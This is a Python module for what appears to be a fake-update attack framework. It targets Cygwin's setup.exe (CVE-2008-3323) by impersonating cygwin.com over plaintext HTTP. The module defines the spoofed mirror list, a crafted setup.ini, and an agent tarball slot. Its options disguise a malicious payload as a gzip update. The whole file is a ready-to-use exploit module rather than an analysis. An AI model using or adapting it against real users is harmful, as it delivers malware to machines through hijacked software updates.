from modules import ModuleBase


class Cygwin(ModuleBase):
    name = 'Cygwin'
    version = '1.0'
    appver = '<= 1.5.25-11'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = """Cygwin is a Linux-like environment for Microsoft Windows copyrighted by
        Red Hat, Inc. Tarball software packages are installed and updated via
        setup.exe. This program downloads a package list and packages from
        mirrors over plaintext HTTP or FTP. The package list contains MD5
        checksums for verifying package integrity. If a rogue server answers the
        HTTP request responsible for package updates and responds with a
        modified MD5 string setup.exe will download and install a malicious package."""
    references = [ [ 'BID', '' ], [ 'CVE', '2008-3323' ], ]
    agent_filename = './agent/cygwin_file.tar.bz2'
    vh = 'cygwin.com' 
    requests = [
        {   'path': '/mirrors.lst',
            'type': 'string',
            'method': '',
            'bin': '',
            'string' : "http://cygwin.com/cygwin;mirror.cygwin.com;North America;New York",
            'parse': '0',
            'file': ''
        },
        {   'path': 'setup.ini',
            'type': 'file',
            'method': '',
            'bin': '',
            'string' : "",
            'parse': '1',
            'file': './include/cygwin/cygwin_setup.ini'
        },
        {   'path': '(.tar.bz2)',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': '0',
            'file': '',
        }
    ]
    options = {
        'name': {
            'val': 'gzip',
            'desc': 'Package name'
        },
        'desc': {
            'val': 'The GNU compression utility',
            'desc': 'Description'
        },
        'category': {
            'val': 'Base',
            'desc': 'Category'
        },
        'requires': {
            'val': 'cygwin',
            'desc': ''
        },
        'version': {
            'val': '3.1.33-7',
            'desc': ''
        },
        'install': {
            'val': 'release/gzip/gzip-3.1.33-7.tar.bz2',
            'desc': ''
        },
        'source': {
            'val': 'release/gzip/gzip-3.1.33-7-src.tar.bz2',
            'desc': ''
        },
        'pversion': {
            'val': '1.3.12-1',
            'desc': ''
        },
        'pinstall': {
            'val': 'release/gzip/gzip-1.3.12-1.tar.bz2',
            'desc': ''
        },
        'psource': {
            'val': 'release/gzip/gzip-1.3.12-1-src.tar.bz2',
            'desc': ''
        },
        'sversion': {
            'val': '2.573.2.2',
            'desc': 'setup version'
        },
        'timestamp': {
            'val': 'time + + 604800',
            'hidden': 1,
            'dynamic': 1,
        }
    }
